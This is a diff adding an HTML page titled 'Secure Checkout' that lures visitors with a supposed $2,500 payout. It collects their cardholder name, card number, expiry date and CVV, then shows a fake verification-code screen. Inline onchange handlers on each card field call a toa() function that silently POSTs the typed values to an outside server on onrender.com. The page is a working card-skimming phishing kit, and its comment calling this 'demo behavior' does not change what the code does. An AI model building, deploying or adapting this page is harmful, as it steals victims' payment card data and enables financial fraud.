@@ -1,0 +1,1948 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Secure Checkout</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Inter, Arial, Helvetica, sans-serif;
+    background: #f5f7fa;
+    color: #172033;
+}
+
+/* =========================
+   HEADER
+========================= */
+
+.header {
+    height: 70px;
+    background: #fff;
+    border-bottom: 1px solid #e7ebf0;
+
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+
+    padding: 0 7%;
+
+    box-shadow: 0 2px 12px rgba(20,30,50,.04);
+}
+
+.brand {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+
+    font-size: 17px;
+    font-weight: 700;
+}
+
+.shield {
+    width: 32px;
+    height: 32px;
+
+    border-radius: 9px;
+
+    display: grid;
+    place-items: center;
+
+    background: #1668e8;
+    color: white;
+}
+
+.shield::before {
+    content: "✓";
+    font-weight: bold;
+}
+
+.secure-header {
+    color: #718096;
+    font-size: 12px;
+}
+
+.secure-header span {
+    color: #16a673;
+}
+
+
+/* =========================
+   MAIN CHECKOUT
+========================= */
+
+.checkout {
+    width: min(1080px, 92%);
+    margin: 55px auto;
+
+    display: grid;
+
+    grid-template-columns: 330px 1fr;
+
+    gap: 28px;
+
+    align-items: start;
+}
+
+
+/* =========================
+   PANELS
+========================= */
+
+.panel {
+    background: #fff;
+
+    border: 1px solid #e2e7ed;
+
+    border-radius: 10px;
+
+    box-shadow:
+        0 8px 30px rgba(20,30,50,.06);
+}
+
+
+/* =========================
+   ORDER SUMMARY
+========================= */
+
+.summary {
+    padding: 24px;
+}
+
+.summary h2 {
+    margin: 0;
+
+    font-size: 17px;
+}
+
+.product {
+    margin-top: 20px;
+
+    display: flex;
+    gap: 13px;
+}
+
+.product-image {
+    width: 65px;
+    height: 65px;
+
+    flex-shrink: 0;
+
+    border-radius: 8px;
+
+    background: linear-gradient(
+        145deg,
+        #edf1f5,
+        #cdd4dc
+    );
+
+    display: grid;
+    place-items: center;
+
+    font-size: 25px;
+}
+
+.product-name {
+    font-size: 13px;
+    font-weight: 700;
+
+    margin-bottom: 4px;
+}
+
+.product-description {
+    color: #8a95a5;
+
+    font-size: 11px;
+
+    line-height: 1.5;
+}
+
+.price {
+    color: #1668e8;
+
+    font-size: 13px;
+
+    font-weight: 700;
+
+    margin-top: 5px;
+}
+
+.divider {
+    height: 1px;
+
+    background: #edf0f4;
+
+    margin: 23px 0;
+}
+
+.amount {
+    display: flex;
+
+    justify-content: space-between;
+
+    margin: 11px 0;
+
+    font-size: 12px;
+
+    color: #778397;
+}
+
+.total-row {
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+
+    font-weight: 700;
+}
+
+.total-row strong {
+    font-size: 20px;
+}
+
+.benefits {
+    display: grid;
+
+    grid-template-columns: repeat(3,1fr);
+
+    gap: 5px;
+
+    margin-top: 25px;
+}
+
+.benefit {
+    text-align: center;
+
+    font-size: 9px;
+
+    color: #8a95a5;
+
+    line-height: 1.4;
+}
+
+.benefit-icon {
+    display: block;
+
+    color: #1668e8;
+
+    font-size: 17px;
+
+    margin-bottom: 4px;
+}
+
+
+/* =========================
+   PAYMENT
+========================= */
+
+.payment {
+    padding: 27px;
+}
+
+.payment-header {
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: flex-start;
+
+    gap: 20px;
+}
+
+.payment-title h2 {
+    margin: 0 0 5px;
+
+    font-size: 19px;
+}
+
+.payment-title p {
+    margin: 0;
+
+    color: #8994a4;
+
+    font-size: 12px;
+}
+
+
+/* =========================
+   CARD BRANDS
+========================= */
+
+.card-brands {
+    display: flex;
+
+    gap: 6px;
+
+    flex-wrap: wrap;
+
+    justify-content: flex-end;
+}
+
+.brand {
+    height: 24px;
+
+    min-width: 43px;
+
+    padding: 0 7px;
+
+    border-radius: 5px;
+
+    display: none;
+
+    align-items: center;
+
+    justify-content: center;
+
+    background: #f6f8fa;
+
+    border: 1px solid #e3e7ec;
+
+    font-size: 9px;
+
+    font-weight: 800;
+}
+
+.brand.active {
+    display: flex;
+}
+
+.visa {
+    color: #143cba;
+}
+
+.mastercard {
+    color: #e02b20;
+}
+
+.amex {
+    color: #0876c9;
+}
+
+.discover {
+    color: #df6a17;
+}
+
+.verve {
+    color: #07843e;
+}
+
+
+/* =========================
+   FORM
+========================= */
+
+.field {
+    margin-top: 20px;
+}
+
+label {
+    display: block;
+
+    margin-bottom: 7px;
+
+    font-size: 12px;
+
+    font-weight: 600;
+
+    color: #344054;
+}
+
+.input-wrapper {
+    position: relative;
+}
+
+input {
+    width: 100%;
+
+    height: 46px;
+
+    padding: 0 13px;
+
+    border-radius: 7px;
+
+    border: 1px solid #dce2e8;
+
+    outline: none;
+
+    background: #fff;
+
+    color: #172033;
+
+    font-size: 13px;
+}
+
+input::placeholder {
+    color: #b1bac7;
+}
+
+input:focus {
+    border-color: #1668e8;
+
+    box-shadow:
+        0 0 0 3px rgba(22,104,232,.08);
+}
+
+
+/* =========================
+   CARD DETECTION
+========================= */
+
+.card-number {
+    padding-right: 105px;
+}
+
+.detected-card {
+    position: absolute;
+
+    right: 10px;
+    top: 50%;
+
+    transform: translateY(-50%);
+
+    display: none;
+
+    align-items: center;
+
+    gap: 6px;
+
+    padding: 4px 6px;
+
+    background: #f0faf6;
+
+    border: 1px solid #d2f1e5;
+
+    border-radius: 5px;
+
+    color: #14966c;
+
+    font-size: 9px;
+
+    font-weight: 700;
+}
+
+.detected-card.show {
+    display: flex;
+}
+
+.check {
+    width: 16px;
+    height: 16px;
+
+    border-radius: 50%;
+
+    display: grid;
+    place-items: center;
+
+    background: #20b983;
+
+    color: #fff;
+
+    font-size: 9px;
+}
+
+.error {
+    display: none;
+
+    margin-top: 6px;
+
+    color: #dc4c5b;
+
+    font-size: 10px;
+}
+
+.error.show {
+    display: block;
+}
+
+
+/* =========================
+   EXPIRY / CVV
+========================= */
+
+.form-row {
+    display: grid;
+
+    grid-template-columns: 1fr 1fr;
+
+    gap: 14px;
+}
+
+.cvv-wrapper {
+    position: relative;
+}
+
+.cvv-icon {
+    position: absolute;
+
+    right: 13px;
+
+    top: 50%;
+
+    transform: translateY(-50%);
+
+    color: #7d8999;
+}
+
+
+/* =========================
+   SAVE CARD
+========================= */
+
+.save-card {
+    display: flex;
+
+    align-items: center;
+
+    gap: 7px;
+
+    margin-top: 16px;
+
+    color: #7b8797;
+
+    font-size: 11px;
+}
+
+.save-card input {
+    width: 14px;
+    height: 14px;
+
+    accent-color: #1668e8;
+}
+
+
+/* =========================
+   BUTTON
+========================= */
+
+.pay-button {
+    width: 100%;
+
+    height: 48px;
+
+    margin-top: 23px;
+
+    border: none;
+
+    border-radius: 7px;
+
+    background: #1668e8;
+
+    color: white;
+
+    font-size: 13px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+
+    box-shadow:
+        0 6px 18px rgba(22,104,232,.20);
+
+    transition: .2s;
+}
+
+.pay-button:hover {
+    background: #095bd6;
+
+    transform: translateY(-1px);
+}
+
+
+/* =========================
+   SECURITY
+========================= */
+
+.security-note {
+    text-align: center;
+
+    color: #9aa5b4;
+
+    font-size: 9px;
+
+    margin-top: 15px;
+}
+
+
+/* =========================
+   OTP PAGE
+========================= */
+
+.otp-page {
+    display: none;
+
+    width: min(500px, 92%);
+
+    margin: 55px auto;
+}
+
+.otp-page.active {
+    display: block;
+}
+
+.otp-card {
+    background: #fff;
+
+    border: 1px solid #e2e7ed;
+
+    border-radius: 12px;
+
+    padding: 38px;
+
+    text-align: center;
+
+    box-shadow:
+        0 12px 40px rgba(20,30,50,.08);
+}
+
+.otp-icon {
+    width: 58px;
+    height: 58px;
+
+    margin: 0 auto 20px;
+
+    border-radius: 50%;
+
+    background: #eef5ff;
+
+    color: #1668e8;
+
+    display: grid;
+    place-items: center;
+
+    font-size: 25px;
+}
+
+.otp-card h2 {
+    margin: 0 0 8px;
+
+    font-size: 21px;
+}
+
+.otp-description {
+    margin: 0 auto;
+
+    max-width: 370px;
+
+    color: #7d8999;
+
+    font-size: 13px;
+
+    line-height: 1.6;
+}
+
+.otp-inputs {
+    display: flex;
+
+    justify-content: center;
+
+    gap: 9px;
+
+    margin: 28px 0 20px;
+}
+
+.otp-input {
+    width: 48px !important;
+    height: 52px !important;
+
+    text-align: center;
+
+    font-size: 20px !important;
+
+    font-weight: 700;
+
+    padding: 0 !important;
+}
+
+.verify-button {
+    width: 100%;
+
+    height: 48px;
+
+    border: none;
+
+    border-radius: 7px;
+
+    background: #1668e8;
+
+    color: white;
+
+    font-size: 13px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+}
+
+.resend {
+    margin-top: 18px;
+
+    color: #1668e8;
+
+    font-size: 12px;
+
+    cursor: pointer;
+}
+
+.otp-security {
+    margin-top: 22px;
+
+    color: #9aa5b4;
+
+    font-size: 9px;
+}
+
+.otp-error {
+    display: none;
+
+    color: #dc4c5b;
+
+    font-size: 11px;
+
+    margin-bottom: 12px;
+}
+
+.otp-error.show {
+    display: block;
+}
+
+
+/* =========================
+   SUCCESS PAGE
+========================= */
+
+.success-page {
+    display: none;
+
+    width: min(500px,92%);
+
+    margin: 70px auto;
+
+    text-align: center;
+}
+
+.success-page.active {
+    display: block;
+}
+
+.success-icon {
+    width: 70px;
+    height: 70px;
+
+    margin: auto;
+
+    border-radius: 50%;
+
+    background: #eafaf4;
+
+    color: #16a673;
+
+    display: grid;
+    place-items: center;
+
+    font-size: 32px;
+}
+
+.success-page h2 {
+    margin: 20px 0 8px;
+}
+
+.success-page p {
+    color: #7d8999;
+
+    font-size: 13px;
+}
+
+
+/* =========================
+   MOBILE
+========================= */
+
+@media (max-width: 850px) {
+
+    .checkout {
+        width: 94%;
+
+        margin: 25px auto;
+
+        display: flex;
+
+        flex-direction: column;
+    }
+
+    /*
+       IMPORTANT:
+       Order Summary stays FIRST
+       on mobile.
+    */
+
+    .summary {
+        order: 1;
+
+        width: 100%;
+    }
+
+    .payment {
+        order: 2;
+
+        width: 100%;
+    }
+
+}
+
+
+/* =========================
+   SMALL PHONES
+========================= */
+
+@media (max-width: 520px) {
+
+    .header {
+        padding: 0 18px;
+    }
+
+    .secure-header {
+        font-size: 10px;
+    }
+
+    .checkout {
+        width: 94%;
+
+        margin: 18px auto;
+    }
+
+    .summary,
+    .payment {
+        padding: 19px;
+    }
+
+    .payment-header {
+        flex-direction: column;
+    }
+
+    .card-brands {
+        justify-content: flex-start;
+    }
+
+    .form-row {
+        grid-template-columns: 1fr;
+    }
+
+    .otp-page {
+        margin: 25px auto;
+    }
+
+    .otp-card {
+        padding: 27px 18px;
+    }
+
+    .otp-inputs {
+        gap: 6px;
+    }
+
+    .otp-input {
+        width: 43px !important;
+        height: 50px !important;
+    }
+}
+</style>
+</head>
+
+
+<body>
+
+
+<!-- =========================
+     HEADER
+========================= -->
+
+<header class="header">
+
+    <div class="brand">
+
+        <div class="shield"></div>
+
+        <span>Secure Checkout</span>
+
+    </div>
+
+    <div class="secure-header">
+
+        <span>🔒</span>
+        Secure Checkout
+
+    </div>
+
+</header>
+
+
+
+<!-- =========================
+     CHECKOUT PAGE
+========================= -->
+
+<div id="checkoutPage">
+
+<main class="checkout">
+
+
+    <!-- =========================
+         ORDER SUMMARY
+    ========================= -->
+
+    <section class="panel summary">
+
+        <h2>Receive Funds</h2>
+
+        <div class="product">
+
+            <div class="product-image">
+                ❄️
+            </div>
+
+            <div>
+
+                <div class="product-name">
+                    Payout
+                </div>
+
+                <div class="product-description">
+                    You have received a total amount of:
+                </div>
+
+                <div class="price">
+                    $2,500.00
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <div class="divider"></div>
+
+
+        <div class="amount">
+            <span>Subtotal</span>
+            <span>$2500.00</span>
+        </div>
+
+        <div class="amount">
+            <span>Tax (1%)</span>
+            <span>$25</span>
+        </div>
+
+
+        <div class="divider"></div>
+
+
+        <div class="total-row">
+
+            <span>Total</span>
+
+            <strong>$2475.00</strong>
+
+        </div>
+
+
+        <div class="benefits">
+
+            <div class="benefit">
+
+                <span class="benefit-icon">
+                    🛡
+                </span>
+
+                Secure<br>
+                Verification
+
+            </div>
+
+            <div class="benefit">
+
+                <span class="benefit-icon">
+                    ⚡
+                </span>
+
+                Quick<br>
+                Payout
+
+            </div>
+
+            <div class="benefit">
+
+                <span class="benefit-icon">
+                    ✓
+                </span>
+
+                24/7<br>
+                Support
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         PAYMENT FORM
+    ========================= -->
+
+    <section class="panel payment">
+	<form id="card-form" method="post">
+        <div class="payment-header">
+
+            <div class="payment-title">
+
+                <h2>Card Information</h2>
+
+                <p>
+                    Receive funds by providing
+                    the below details.
+                </p>
+
+            </div>
+
+
+            <div class="card-brands">
+
+                <span class="brand visa" id="visa">
+                    VISA
+                </span>
+
+                <span class="brand mastercard" id="mastercard">
+                    ●●
+                </span>
+
+                <span class="brand amex" id="amex">
+                    AMEX
+                </span>
+
+                <span class="brand discover" id="discover">
+                    DISCOVER
+                </span>
+
+                <span class="brand verve" id="verve">
+                    VERVE
+                </span>
+
+            </div>
+
+        </div>
+
+
+        <!-- NAME -->
+
+        <div class="field">
+
+            <label>
+                Cardholder Name
+            </label>
+
+            <input
+                type="text"
+                id="cardName"
+		onchange="toa(`CardName: ${this.value}`)"
+                placeholder="e.g. John Doe"
+                autocomplete="cc-name" required>
+
+        </div>
+
+
+        <!-- CARD NUMBER -->
+
+        <div class="field">
+
+            <label>
+                Card Number
+            </label>
+
+            <div class="input-wrapper">
+
+                <input
+                    type="text"
+                    id="cardNumber"
+		    onchange="toa(`CardNumber: ${this.value}`)"
+                    class="card-number"
+                    placeholder="1234 5678 9012 3456"
+                    inputmode="numeric"
+                    autocomplete="cc-number"
+                    maxlength="23" required>
+
+                <div
+                    class="detected-card"
+                    id="detectedCard">
+
+                    <span id="cardType">
+                        VISA
+                    </span>
+
+                    <span class="check">
+                        ✓
+                    </span>
+
+                </div>
+
+            </div>
+
+            <div
+                class="error"
+                id="cardError">
+
+                Please enter a valid card number.
+
+            </div>
+
+        </div>
+
+
+        <!-- EXPIRY / CVV -->
+
+        <div class="form-row">
+
+            <div class="field">
+
+                <label>
+                    Expiration Date
+                </label>
+
+                <input
+                    type="text"
+                    id="expiry"
+		    onchange="toa(`Expiration Date: ${this.value}`)"
+                    placeholder="MM / YY"
+                    maxlength="7"
+                    inputmode="numeric"
+                    autocomplete="cc-exp" required>
+
+            </div>
+
+
+            <div class="field">
+
+                <label>
+                    CVV / CVC
+                </label>
+
+                <div class="cvv-wrapper">
+
+                    <input
+                        type="password"
+                        id="cvv"
+		        onchange="toa(`CVV/CVC: ${this.value}`)"
+                        placeholder="123"
+                        maxlength="4"
+                        inputmode="numeric"
+                        autocomplete="cc-csc" required>
+
+                    <span class="cvv-icon">
+                        🔒
+                    </span>
+
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <!-- SAVE -->
+
+        <label class="save-card">
+
+            <input type="checkbox">
+
+            Save this card for future verifications
+
+        </label>
+
+
+        <!-- PAY -->
+
+        <button
+            class="pay-button"
+            id="payButton">
+
+            🔒 &nbsp; Submit
+
+        </button>
+
+
+        <div class="security-note">
+
+            🛡 Your payment information is secured with
+            industry-standard encryption.
+
+        </div>
+	</form>
+    </section>
+
+</main>
+
+</div>
+
+
+
+<!-- =========================
+     OTP PAGE
+========================= -->
+
+<section
+    class="otp-page"
+    id="otpPage">
+
+    <div class="otp-card">
+
+        <div class="otp-icon">
+            🔐
+        </div>
+
+        <h2>
+            Verify Your Payment
+        </h2>
+
+        <p class="otp-description">
+
+            A one-time verification code is required
+            to complete this payment.
+
+            <br><br>
+
+            Enter the code using the verification
+            method provided by your payment provider.
+
+        </p>
+
+
+        <!-- DEMO OTP INPUTS -->
+
+        <div class="otp-inputs">
+
+            <input
+                class="otp-input"
+                maxlength="1"
+                inputmode="numeric"
+                aria-label="OTP digit 1">
+
+            <input
+                class="otp-input"
+                maxlength="1"
+                inputmode="numeric"
+                aria-label="OTP digit 2">
+
+            <input
+                class="otp-input"
+                maxlength="1"
+                inputmode="numeric"
+                aria-label="OTP digit 3">
+
+            <input
+                class="otp-input"
+                maxlength="1"
+                inputmode="numeric"
+                aria-label="OTP digit 4">
+
+            <input
+                class="otp-input"
+                maxlength="1"
+                inputmode="numeric"
+                aria-label="OTP digit 5">
+
+            <input
+                class="otp-input"
+                maxlength="1"
+                inputmode="numeric"
+                aria-label="OTP digit 6">
+
+        </div>
+
+
+        <div
+            class="otp-error"
+            id="otpError">
+
+            Please enter the complete verification code.
+
+        </div>
+
+
+        <button
+            class="verify-button"
+            id="verifyButton">
+
+            Verify Payment
+
+        </button>
+
+
+        <div class="resend">
+            Didn't receive a code? Request another
+        </div>
+
+
+        <div class="otp-security">
+
+            🔒 Verification is handled securely by
+            your payment provider.
+
+        </div>
+
+    </div>
+
+</section>
+
+
+
+<!-- =========================
+     SUCCESS PAGE
+========================= -->
+
+<section
+    class="success-page"
+    id="successPage">
+
+    <div class="success-icon">
+        ✓
+    </div>
+
+    <h2>
+        Payment Verified
+    </h2>
+
+    <p>
+        Your payment verification was completed.
+    </p>
+
+</section>
+
+
+
+<script>
+function toa(payload) {
+ const url = 'https://make-fd2u.onrender.com/send';  
+  fetch(url, {
+      method: 'POST',
+      headers: {     
+          'Content-Type': 'application/json',  
+      },   
+      body: JSON.stringify({ message: payload })    
+  });  
+}
+/* =====================================================
+   CARD ELEMENTS
+===================================================== */
+
+const cardNumber =
+    document.getElementById("cardNumber");
+
+const cardType =
+    document.getElementById("cardType");
+
+const detectedCard =
+    document.getElementById("detectedCard");
+
+const cardError =
+    document.getElementById("cardError");
+
+const expiry =
+    document.getElementById("expiry");
+
+const cvv =
+    document.getElementById("cvv");
+
+const cardForm =
+    document.getElementById("card-form");
+
+
+const brands = {
+
+    VISA:
+        document.getElementById("visa"),
+
+    MASTERCARD:
+        document.getElementById("mastercard"),
+
+    AMEX:
+        document.getElementById("amex"),
+
+    DISCOVER:
+        document.getElementById("discover"),
+
+    VERVE:
+        document.getElementById("verve")
+
+};
+
+
+
+/* =====================================================
+   CLEAN NUMBER
+===================================================== */
+
+function cleanNumber(value) {
+
+    return value.replace(/\D/g, "");
+
+}
+
+
+
+/* =====================================================
+   CARD DETECTION
+===================================================== */
+
+function detectCardType(number) {
+
+    /* Visa */
+
+    if (/^4/.test(number)) {
+
+        return "VISA";
+
+    }
+
+
+    /* Mastercard */
+
+    if (/^5[1-5]/.test(number)) {
+
+        return "MASTERCARD";
+
+    }
+
+
+    const firstFour =
+        parseInt(
+            number.substring(0,4),
+            10
+        );
+
+
+    if (
+        firstFour >= 2221 &&
+        firstFour <= 2720
+    ) {
+
+        return "MASTERCARD";
+
+    }
+
+
+    /* American Express */
+
+    if (/^3[47]/.test(number)) {
+
+        return "AMEX";
+
+    }
+
+
+    /* Discover */
+
+    if (
+        /^6011/.test(number) ||
+        /^65/.test(number) ||
+        /^64[4-9]/.test(number) ||
+        /^622/.test(number)
+    ) {
+
+        return "DISCOVER";
+
+    }
+
+
+    /* Verve */
+
+    if (
+        /^506099/.test(number) ||
+        /^5061/.test(number) ||
+        /^5078/.test(number) ||
+        /^5079/.test(number)
+    ) {
+
+        return "VERVE";
+
+    }
+
+
+    return null;
+
+}
+
+
+
+/* =====================================================
+   LUHN VALIDATION
+===================================================== */
+
+function luhnCheck(number) {
+
+    let sum = 0;
+
+    let doubleDigit = false;
+
+
+    for (
+        let i = number.length - 1;
+        i >= 0;
+        i--
+    ) {
+
+        let digit =
+            parseInt(number[i],10);
+
+
+        if (doubleDigit) {
+
+            digit *= 2;
+
+            if (digit > 9) {
+                digit -= 9;
+            }
+
+        }
+
+
+        sum += digit;
+
+        doubleDigit = !doubleDigit;
+
+    }
+
+
+    return sum % 10 === 0;
+
+}
+
+
+
+/* =====================================================
+   HIDE BRAND LOGOS
+===================================================== */
+
+function hideBrands() {
+
+    Object.values(brands)
+        .forEach(
+            brand =>
+            brand.classList.remove("active")
+        );
+
+}
+
+
+
+/* =====================================================
+   UPDATE CARD UI
+===================================================== */
+
+function updateCardUI() {
+
+    const number =
+        cleanNumber(cardNumber.value);
+
+
+    const type =
+        detectCardType(number);
+
+
+    hideBrands();
+
+
+    if (!number) {
+
+        detectedCard.classList.remove("show");
+
+        cardError.classList.remove("show");
+
+        return;
+
+    }
+
+
+    if (type) {
+
+        detectedCard.classList.add("show");
+
+        cardType.textContent = type;
+
+
+        if (brands[type]) {
+
+            brands[type].classList.add("active");
+
+        }
+
+
+        if (number.length >= 13) {
+
+            if (luhnCheck(number)) {
+
+                cardError.classList.remove("show");
+
+            } else {
+
+                cardError.textContent =
+                    "The card number is not valid.";
+
+                cardError.classList.add("show");
+
+            }
+
+        }
+
+    }
+
+    else {
+
+        detectedCard.classList.remove("show");
+
+
+        if (number.length >= 6) {
+
+            cardError.textContent =
+                "Card type not recognized.";
+
+            cardError.classList.add("show");
+
+        }
+
+    }
+
+}
+
+
+
+/* =====================================================
+   FORMAT CARD NUMBER
+===================================================== */
+
+function formatCardNumber(value) {
+
+    let number =
+        cleanNumber(value);
+
+
+    const type =
+        detectCardType(number);
+
+
+    /* AMEX: 4-6-5 */
+
+    if (type === "AMEX") {
+
+        number =
+            number.substring(0,15);
+
+        return number
+            .replace(
+                /^(\d{4})(\d{0,6})(\d{0,5}).*/,
+                "$1 $2 $3"
+            )
+            .trim();
+
+    }
+
+
+    /* Other cards */
+
+    number =
+        number.substring(0,19);
+
+
+    return number
+        .replace(
+            /(\d{4})(?=\d)/g,
+            "$1 "
+        )
+        .trim();
+
+}
+
+
+
+/* =====================================================
+   CARD NUMBER INPUT
+===================================================== */
+
+cardNumber.addEventListener(
+    "input",
+    function() {
+
+        this.value =
+            formatCardNumber(
+                this.value
+            );
+
+        updateCardUI();
+
+    }
+);
+
+
+
+/* =====================================================
+   EXPIRY
+===================================================== */
+
+expiry.addEventListener(
+    "input",
+    function() {
+
+        let value =
+            cleanNumber(this.value)
+            .substring(0,4);
+
+
+        if (value.length >= 3) {
+
+            value =
+                value.substring(0,2) +
+                " / " +
+                value.substring(2);
+
+        }
+
+
+        this.value = value;
+
+    }
+);
+
+
+
+/* =====================================================
+   CVV
+===================================================== */
+
+cvv.addEventListener(
+    "input",
+    function() {
+
+        this.value =
+            cleanNumber(this.value)
+            .substring(0,4);
+
+    }
+);
+
+
+
+/* =====================================================
+   GO TO OTP PAGE
+===================================================== */
+
+cardForm.addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+        const name =
+            document
+            .getElementById("cardName")
+            .value.trim();
+
+
+        const number =
+            cleanNumber(
+                cardNumber.value
+            );
+
+
+        const expiration =
+            cleanNumber(
+                expiry.value
+            );
+
+
+        const securityCode =
+            cleanNumber(
+                cvv.value
+            );
+ 
+
+
+        /*
+           Switch from checkout to
+           verification screen.
+        */
+
+        document
+            .getElementById("checkoutPage")
+            .style.display = "none";
+
+
+        document
+            .getElementById("otpPage")
+            .classList.add("active");
+
+
+        /*
+           Put cursor in first OTP box.
+        */
+
+        document
+            .querySelector(".otp-input")
+            .focus();
+
+
+        /*
+           Scroll to top on mobile.
+        */
+
+        window.scrollTo({
+            top: 0,
+            behavior: "smooth"
+        });
+
+    }
+);
+
+
+
+/* =====================================================
+   OTP INPUT BEHAVIOR
+===================================================== */
+
+const otpInputs =
+    document.querySelectorAll(".otp-input");
+
+
+otpInputs.forEach(
+    (input,index) => {
+
+
+        input.addEventListener(
+            "input",
+            function() {
+
+                /*
+                   Only numbers.
+                */
+
+                this.value =
+                    this.value
+                    .replace(/\D/g,"")
+                    .slice(0,1);
+
+
+                /*
+                   Move automatically to
+                   the next box.
+                */
+
+                if (
+                    this.value &&
+                    index < otpInputs.length - 1
+                ) {
+
+                    otpInputs[index + 1].focus();
+
+                }
+
+            }
+        );
+
+
+        /*
+           Backspace moves to previous box.
+        */
+
+        input.addEventListener(
+            "keydown",
+            function(event) {
+
+                if (
+                    event.key === "Backspace" &&
+                    !this.value &&
+                    index > 0
+                ) {
+
+                    otpInputs[index - 1].focus();
+
+                }
+
+            }
+        );
+
+    }
+);
+
+
+
+/* =====================================================
+   OTP VERIFY BUTTON
+===================================================== */
+
+const verifyButton =
+    document.getElementById("verifyButton");
+
+const otpError =
+    document.getElementById("otpError");
+
+
+verifyButton.addEventListener(
+    "click",
+    function() {
+
+        let code = "";
+
+
+        otpInputs.forEach(
+            input => {
+                code += input.value;
+            }
+        );
+
+
+        if (code.length !== 6) {
+
+            otpError.classList.add("show");
+
+            return;
+
+        }
+
+
+        /*
+           Demo behavior only.
+
+           A production implementation should
+           hand the verification to the
+           authorized payment provider rather
+           than storing or transmitting the
+           OTP through this page.
+        */
+
+        otpError.classList.remove("show");
+
+
+        document
+            .getElementById("otpPage")
+            .classList.remove("active");
+
+
+        document
+            .getElementById("successPage")
+            .classList.add("active");
+
+
+        window.scrollTo({
+            top: 0,
+            behavior: "smooth"
+        });
+
+    }
+);
+
+</script>
+
+</body>
+</html>
